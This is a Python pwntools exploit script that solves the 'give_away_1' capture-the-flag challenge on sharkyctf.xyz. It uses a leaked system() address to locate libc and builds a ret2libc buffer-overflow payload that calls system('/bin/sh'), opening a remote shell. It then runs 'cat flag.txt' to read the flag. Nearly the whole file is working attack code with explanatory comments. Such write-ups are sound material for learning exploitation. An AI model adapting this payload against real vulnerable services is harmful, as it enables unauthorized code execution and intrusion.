#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host sharkyctf.xyz --port 20334
from pwn import *

# Set up pwntools for the correct architecture
context.update(arch='i386')
exe = context.binary = ELF('./give_away_1')
context.terminal = ["xfce4-terminal", "-e"]
# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or 'sharkyctf.xyz'
port = int(args.PORT or 20334)


def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)


def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    global libc
    if args.LOCAL:
        libc = ELF('/usr/lib32/libc.so.6')
        return local(argv, *a, **kw)
    else:
        libc = ELF('libc-2.27.so')
        return remote(argv, *a, **kw)


# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
break vuln
continue
'''.format(**locals())

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================


def send_payload(proc, payload):
    proc.sendline(payload)


io = start()

offset = 0x20+0x4  # buf offset

# the giveaway is the address of system in libc
system_ptr = int(io.recvline_startswith("Give away")[-8:], 0x10)

# calculating the base address for libc
libc.address = system_ptr-libc.sym['system']

# we search for the address of "/bin/sh" string in libc
binsh_ptr = next(libc.search(b'/bin/sh'))
payload = b'A'*offset

# we call system and push the binsh pointer as an argument
payload += p32(libc.symbols['system']) + p32(0xdeadbeef) + p32(binsh_ptr)

send_payload(io, payload)

send_payload(io, "cat flag.txt")
print(io.recv())

